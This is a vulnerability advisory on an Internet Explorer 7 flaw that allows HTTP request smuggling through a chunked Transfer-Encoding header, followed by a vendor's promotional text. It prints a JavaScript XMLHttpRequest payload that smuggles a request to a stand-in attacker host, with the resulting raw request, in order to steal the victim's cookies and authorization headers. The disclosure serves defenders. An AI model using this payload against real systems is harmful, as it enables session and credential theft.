# Code **Advisories**

## #MSA01240108

Microsoft Internet Explorer "Transfer-Encoding: chunked" allows Request Splitting/Smuggling.

##### **Tested Versions:**

Internet Explorer 7.0.5730.11

##### **Tested OS:**

XP Professional SP2 Italian

##### **Minded Security ReferenceID:**

MSA01240108

##### **Credits:**

Discovery by

Stefano Di Paola of Minded Security

stefano.dipaola [\_at\_] mindedsecurity.com

##### **Reference:**

MSA01240108

##### **Severity:**

Medium/High

##### **Summary**

Internet Explorer 7 allows setting of header “Transfer Encoding: chunked” in setRequestHeader exposing the browser to Http Request Splitting/Smuggling attacks.

##### **Analysis**

Let’s suppose the following scenery (which is not necessarily the only one).

– A site vulnerable to reflected Xss is hosted on the same host as an attacker site.

– User has no proxy configured.

As IE7 allows setting

```

setRequestHeader("Transfer-Encoding","chunked");

```

so, it allows using the payload in a POST request which will be considered as another request by the web server.

For example:

```

-----------------------------------------------------

var x=new XMLHttpRequest();

for(var i =0; i<1;i++){

x.open("POST","/");

x.setRequestHeader("Transfer-Encoding","chunked");

x.setRequestHeader("Proxy-Connection","keep-alive");

x.setRequestHeader("Connection","keep-alive");

x.onreadystatechange=function (){

if (x.readyState == 4){

}

}

try{

x.send("0\r\n\r\nPOST / HTTP/1.1\r\nHost:

at.tack.er\r\nContent-Length: SOMELENGTH\r\n\r\n") }catch(r){} }

-----------------------------------------------------

```

the request will become:

```

----------------------------------------------------

POST / HTTP/1.1

Accept: */*

Accept-Language: it

Transfer-Encoding: chunked

Connection: keep-alive

Cache-Control: no-cache

Referer: <http://vi.ct.im/>

UA-CPU: x86

Accept-Encoding: gzip, deflate

User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;

.NET CLR 2.0.50727; .NET CLR 1.1.4322)

Host: at.tack.er

Content-Length: 67

0

POST /?Send1 HTTP/1.1

Host: at.tack.er

Content-Length: TheLenghtOfTheNextRequest

----------------------------------------------------

```

That way, the web server, will wait for the payload, keeping the

socket open.

Infact RFC 2616 says that :

```

---------

If a message is received with both a Transfer-Encoding header

field and a Content-Length header field, the latter MUST be

ignored.

---------

```

So the payload will be parsed as chunked.

Then by forcing IE to perform several requests on the victim host, the browser will reuse the previous (open) socket, thus sending the request as payload to the attacker site.

When at.tack.er host receive the request, there are several attacks, it could perform:

1. Stealing the headers of the request to vi.ct.im host (httponly cookies, Authorization data..)

2. Perform local cache poisoning by using Expire: header from the attacker poisoned page.

A proof of concept was developed.

Keep in mind that several other sceneries could be abused as well (see references).

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
